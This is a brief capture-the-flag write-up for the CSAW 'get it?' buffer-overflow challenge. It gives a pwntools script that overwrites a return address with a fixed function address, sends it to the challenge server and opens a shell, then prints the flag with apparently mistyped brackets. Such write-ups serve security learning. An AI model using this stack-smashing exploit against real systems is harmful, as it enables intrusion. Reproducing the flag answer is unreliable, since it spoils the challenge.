# **get it?**

#### tag : pwn, bof

-----------------------------------------------

#### Description

>Do you get it?
>
>nc pwn.chal.csaw.io 9001

-----------------------------------------------

#### Solution

```python

from pwn import *

### DEBUGGING ###

DEBUG = False

if DEBUG:
    r = process('get_it')
    timeout = 0.1

    context.log_level = 'debug'
#    gdb.attach(r)
else :
    r = remote('pwn.chal.csaw.io',9001)
    timeout = 0.3

def rr(s):
    return r.recvuntil(s)

def ss(s):
    return r.sendline(s)

### ADDRESS ###

sh = 0x4005b6

### PAYLOAD ###

payload = 'a'*0x28
payload += p64(sh)

### EXPLOIT ###

rr('??')
ss(payload)
r.interactive()

```

**flag{y0u_deF_get_itls}}**
